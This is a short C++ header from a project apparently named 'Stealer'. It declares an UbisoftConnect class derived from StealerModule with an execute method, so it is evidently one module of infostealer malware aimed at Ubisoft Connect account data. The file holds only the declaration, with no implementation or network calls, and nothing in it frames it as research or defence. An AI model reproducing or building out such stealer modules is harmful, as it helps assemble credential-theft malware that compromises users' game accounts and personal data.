//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_UBISOFTCONNECT_H
#define STEALER_UBISOFTCONNECT_H


#include "../../../StealerModule.h"

class UbisoftConnect : public StealerModule {
public:
    void execute(fs::path &root) override;
};


#endif //STEALER_UBISOFTCONNECT_H
